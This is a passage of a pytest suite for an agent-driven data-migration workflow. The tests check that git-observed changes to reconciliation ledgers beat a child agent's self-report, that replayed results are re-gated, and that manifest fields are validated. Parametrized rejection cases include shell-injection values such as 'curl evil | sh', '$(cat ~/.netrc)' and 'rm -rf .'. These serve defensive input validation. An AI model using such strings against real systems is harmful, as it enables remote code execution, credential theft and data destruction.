    # touched (its tree equals the launch base: with auto_merge off it merges nothing); a rewritten
    # result.json, the verifier's own report and anything else that reached the branch stay
    assert ns["verifier_changed_paths"](2, passed) == [
        ".migration/03_recon_tolerances.json", ".migration/recon/u/result.json", ".migration/recon/wave-2/report.md",
        "src/loans.sql"]
    assert calls[0][3:] == ["fetch", "-q", "origin", "+recon/wave-2:refs/migration/wave-orders-1/recon/wave-2"]
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "v" * 40]
    assert calls[6][3:] == ["diff", "--name-only", "--no-renames", "1" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[7][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[8][3:] == ["diff", "--name-only", "--no-renames", "2" * 40, "v" * 40, "--", ".migration/recon/v/"]
    assert calls[10][3:] == ["diff", "--name-only", "--no-renames", "3" * 40, "v" * 40, "--", ".migration/recon/w/"]
    assert calls[11][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/w/"]
    # a passed batch whose gated head is unknown, or a diff git cannot answer: unverifiable, no PASS stands
    assert ns["verifier_changed_paths"](2, [{"batch": "b1", "units": ["u"]}]) is None

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["verifier_changed_paths"](2, passed) is None


def test_git_observed_ledger_changes_beat_a_clean_self_report():
    ns = _batch_runtime()
    seen = []
    ns["pr_changed_paths"] = lambda pr_url: seen.append(pr_url) or ("c" * 40, ["src/loans.sql", ".migration/03_recon_tolerances.json"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert ".migration/03_recon_tolerances.json" in out["one_line_summary"]
    assert seen == ["https://example/pr/1"]  # the PR, not the branch the child names
    assert out["pr_head"] == "c" * 40  # the gated head, for the verifier's tree to be held to
    ns["pr_changed_paths"] = lambda pr_url: ("c" * 40, ["src/loans.sql"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
    ns["pr_changed_paths"] = lambda pr_url: None
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and "git" in out["one_line_summary"]


def test_a_replayed_pass_keeps_the_gate_it_passed_in_the_run_being_resumed():
    """On a resume the finished child replays, but its PR has been merged by that run's verifier (or
    forked after other accepted units were), so re-diffing it now would attribute their evidence to it.
    The recorded record is the workflow's own ledger: its gated head stands, git is not asked again,
    but only for the same result: the runtime replays a finished agent for an unchanged prompt only, so
    the record must carry the hash of the prompt it answered and name the same PR. A record from before
    the brief changed, or naming another PR, describes a different child and its PR is gated afresh."""
    ns = _batch_runtime()
    ns["pr_changed_paths"] = lambda pr_url: pytest.fail("a replayed PASS is gated through replay_gate")
    asked = []
    ns["replay_gate"] = lambda record, pr_url: asked.append((record["pr_head"], pr_url)) or ("c" * 40, [])
    sha = ns["prompt_sha"](ns["child_prompt"](dict(BATCH)))
    assert re.fullmatch(r"[0-9a-f]{16,}", sha) and sha != ns["prompt_sha"](ns["child_prompt"]({**BATCH, "brief": "b2"}))
    same = {"id": "b", "status": "PASS", "pr_head": "c" * 40, "pr_url": "https://example/pr/1", "prompt_sha": sha}
    ns["REPLAYED"] = {"b": same}
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
    assert asked == [("c" * 40, "https://example/pr/1")]  # git is asked whether the PR still points at the record
    assert out["prompt_sha"] == sha  # every result records the prompt it answered, for the next resume
    # the PR gained a commit since the record (replay_gate gates the new head): a ledger change in it fails
    ns["replay_gate"] = lambda record, pr_url: ("e" * 40, [".migration/allowed_targets.json"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and out["pr_head"] == "e" * 40
    ns["replay_gate"] = lambda record, pr_url: None  # git could not answer: unverifiable
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and "git" in out["one_line_summary"]
    # a changed brief, another PR, a record without the binding, a replayed FAIL, or a PASS recorded
    # before any head was gated, is gated like a new result
    for record in ({**same, "prompt_sha": ns["prompt_sha"]("other brief")}, {**same, "pr_url": "https://example/pr/2"},
                   {k: v for k, v in same.items() if k != "prompt_sha"}, {k: v for k, v in same.items() if k != "pr_url"},
                   {**same, "status": "FAIL"}, {k: v for k, v in same.items() if k != "pr_head"}, "PASS"):
        ns["REPLAYED"] = {"b": record}
        ns["pr_changed_paths"] = lambda pr_url: ("d" * 40, [".migration/03_recon_tolerances.json"])
        out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
        assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and out["pr_head"] == "d" * 40
    src = WORKFLOW.read_text()
    assert re.search(r'REPLAYED = \{\n    b\["id"\]: b for b in', src)


def test_a_replayed_pass_that_fails_the_gate_now_is_a_new_failure_the_breaker_counts():
    """A replayed failure was counted by the run being resumed and is not counted again; a replayed PASS
    whose PR no longer stands (gained a ledger edit, or cannot be verified) is a failure that run never
    saw, so it counts, or three such PRs would never halt the wave."""
    ns = _batch_runtime()
    sha = ns["prompt_sha"](ns["child_prompt"](dict(BATCH)))
    passed = {"id": "b", "status": "PASS", "pr_head": "c" * 40, "pr_url": "https://example/pr/1", "prompt_sha": sha}

    def run(record, gate, report):
        ns["REPLAYED"] = {"b": record}
        ns["replay_gate"] = lambda record, pr_url: gate
        ns["pr_changed_paths"] = lambda pr_url: gate
        breaker = ns["Breaker"](3)

        async def agent(prompt, **kwargs):
            return dict(report)

        ns["agent"] = agent
        out = asyncio.run(ns["run_batch"](dict(BATCH), asyncio.Semaphore(1), breaker))
        return out, dict(breaker.classes)

    out, counted = run(passed, ("e" * 40, [".migration/allowed_targets.json"]), _pass(changed_paths=["src/a.sql"]))
    assert out["failure_class"] == "ledger_tampered" and counted == {"ledger_tampered": 1}
    out, counted = run(passed, None, _pass(changed_paths=["src/a.sql"]))
    assert out["failure_class"] == "ledger_tampered" and counted == {"ledger_tampered": 1}
    # the PR still stands: PASS, nothing counted
    out, counted = run(passed, ("c" * 40, []), _pass(changed_paths=["src/a.sql"]))
    assert out["status"] == "PASS" and counted == {}
    # a PASS record may carry the optional failure_class; it was still never counted
    out, counted = run({**passed, "failure_class": "ledger_tampered"}, ("e" * 40, [".migration/allowed_targets.json"]),
                       _pass(changed_paths=["src/a.sql"]))
    assert out["failure_class"] == "ledger_tampered" and counted == {"ledger_tampered": 1}
    # a replayed FAIL is the failure the resumed run already counted, unless the gate now gives it another class
    failed = {**passed, "status": "FAIL", "failure_class": "recon_fail"}
    replayed = {"status": "FAIL", "recon_verdict": "FAIL", "failure_class": "recon_fail",
                "pr_url": "https://example/pr/1", "one_line_summary": "replayed"}
    out, counted = run(failed, ("c" * 40, []), replayed)
    assert out["status"] == "FAIL" and counted == {}
    out, counted = run(failed, ("e" * 40, [".migration/allowed_targets.json"]), replayed)
    assert out["failure_class"] == "ledger_tampered" and counted == {"ledger_tampered": 1}


@pytest.mark.parametrize("value", ["--upload-pack=touch /tmp/x", "-q", "main..x", "a b", "", 3, "^main", "m:n"])
def test_validate_manifest_rejects_base_branch_and_wave_values_git_could_misread(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="base_branch"):
        validate_manifest(_manifest(base_branch=value))
    validate_manifest(_manifest(base_branch="release/2026.09"))
    with pytest.raises(SystemExit, match="wave"):
        validate_manifest(_manifest(wave="2 --exec"))


def test_validate_manifest_rejects_a_unit_owned_by_two_batches():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit.*orders_load.*b1.*b2"):
        validate_manifest(_manifest(batches=[{"id": "b1", "units": ["orders_load"], "write_targets": ["t1"], "brief": "x"},
                                             {"id": "b2", "units": ["orders_load", "v"], "write_targets": ["t2"], "brief": "y"}]))


@pytest.mark.parametrize("unit", ["../03_recon_tolerances.json", "u/..", "a/b", "wave-1", "", ".", "..", ".hidden", 3])
def test_validate_manifest_rejects_unit_ids_that_are_not_a_plain_recon_dir_name(unit):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit id"):
        validate_manifest(_manifest(batches=[{"id": "b", "units": [unit], "write_targets": ["t"], "brief": "x"}]))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["orders_load", "u.v-2"], "write_targets": ["t"], "brief": "x"}]))


@pytest.mark.parametrize("source", ["LEGACY_ODBC", {"family": "sqlserver"}, {"secret": "X"}, {"family": "", "secret": "X"},
                                    {"family": "sqlserver", "secret": "X", "params": ["a=b"]},
                                    # these are pasted into the children's doctor command line
                                    {"family": "sqlserver; curl evil | sh", "secret": "X"},
                                    {"family": "sqlserver", "secret": "$(cat ~/.netrc)"},
                                    # secret is an environment variable NAME: no shell can set these
                                    {"family": "sqlserver", "secret": "secrets/legacy.dsn"},
                                    {"family": "sqlserver", "secret": "LEGACY.ODBC"},
                                    {"family": "sqlserver", "secret": "LEGACY-ODBC"},
                                    {"family": "sqlserver", "secret": "1LEGACY"},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "loans && rm -rf ."}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db=x --unit": "y"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "--role orchestrator"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52 x"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08  18:43"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "a'b"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": 7}}])
def test_validate_manifest_checks_the_source_block(source):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="source"):
        validate_manifest(_manifest(source=source))
    validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "loan_servicing"}}))
    validate_manifest(_manifest(source={"family": "postgres", "secret": "_lakebase_src_2"}))


def test_param_values_follow_the_recon_contract_so_a_timestamp_is_accepted():
    """A mapping's ${as_of} is typically 'YYYY-MM-DD hh:mm:ss'; the recon CLI accepts exactly that
    (PARAM_RE), so the workflow must not reject it, and must quote it so the child's shell passes one value."""
    sys.path.insert(0, str(WORKFLOW.parents[1] / "data-reconciliation" / "harness"))
    from recon.cli import PARAM_RE
    ns = _functions()
    assert ns["PARAM_VALUE"].pattern == PARAM_RE.pattern.removeprefix("^").removesuffix("$")
    source = {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52", "db": "loans"}}
    ns["validate_manifest"](_manifest(source=source))
    text = _prompt_ns(_manifest(source=source))["child_prompt"](_manifest()["batches"][0])
    flags = text[text.index("--source-family"):].split(" (the source")[0]
    assert shlex.split(flags) == ["--source-family", "sqlserver", "--source-secret", "X",
                                  "--param", "as_of=2026-09-08 18:43:52", "--param", "db=loans"]


def test_child_prompt_passes_the_source_family_and_secret_to_the_doctor():
    ns = _prompt_ns(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "x"}}))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--source-family postgres --source-secret LAKEBASE_SRC --param db=x" in text
    assert "--source-family" not in _prompt_ns(_manifest())["child_prompt"](_manifest()["batches"][0])
